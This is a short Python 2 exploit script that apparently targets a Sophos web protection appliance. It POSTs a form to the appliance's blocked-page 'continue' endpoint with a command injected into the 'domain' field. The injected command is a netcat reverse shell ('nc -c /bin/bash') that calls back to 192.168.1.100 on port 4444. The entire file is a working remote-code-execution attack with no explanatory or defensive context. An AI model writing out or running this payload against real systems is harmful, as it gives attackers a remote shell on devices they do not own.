import sys
import httplib

def main():
    if len(sys.argv) < 2:
        print "Usage: sophos_wpa_command_injection.py <target_ip>"
        sys.exit(1)

    host = sys.argv[1]
    port = 443

    headers = {'Host': host,
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64;
rv:21.0) Gecko/20100101 Firefox/21.0',
               'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
               'Accept-Encoding': 'gzip, deflate',
               'Connection': 'keep-alive',
               'Content-Type': 'application/x-www-form-urlencoded'
               }

    body  = 'url=aHR0cDovL3d3dy5leGFtcGxlLmNvbQ%3d%3d'
    body +=
'&args_reason=something_different_than_filetypewarn&filetype=dummy&user=buffalo'
    body +=
'&user_encoded=YnVmZmFsbw%3d%3d&domain=http%3a%2f%2fexample.com%3b%2fbin%2fnc%20-c%20%2fbin%2fbash%20192.168.1.100%204444'
    body += '&raw_category_id=one%7ctwo%7cthree%7cfour'

    conn = httplib.HTTPSConnection(host, port)
    conn.request('POST',
'/end-user/index.php?c=blocked&action=continue', body=body, headers=headers)
    
    #Don't wait for the server response since it will be blocked by the
spawned shell
    conn.close()
    print 'Done.'

if __name__ == '__main__':
    main()
